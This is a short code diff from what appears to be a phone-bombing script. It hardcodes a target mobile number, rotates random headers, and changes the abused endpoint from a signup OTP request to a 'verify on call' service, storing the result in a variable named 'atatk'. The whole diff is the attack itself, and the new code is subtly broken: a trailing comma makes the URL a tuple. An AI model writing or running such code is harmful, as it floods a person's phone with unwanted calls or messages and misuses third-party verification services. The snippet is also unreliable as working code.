@@ -52,12 +52,10 @@ random_head = random.choice(heads)
 
 number = "9373058966"
 
+url = "https://api.magicbricks.com/bricks/verifyOnCall.html",
+params = {
+    "mobile": number
+}
+# "identifier": "callmade"
 
-url_ = "https://gw.taaghche.com/v4/site/auth/signup"
-json_ = {"contact": "0"+nu}
-
-#req_ = requests.post(url=url_,json=json_,headers=random_head)
-#print("jabama",req_)
-
-req_ = requests.post(url=url_,json=json_,headers=random_head)
-print("",req_)
+atatk = requests.get(url=url,json=params)
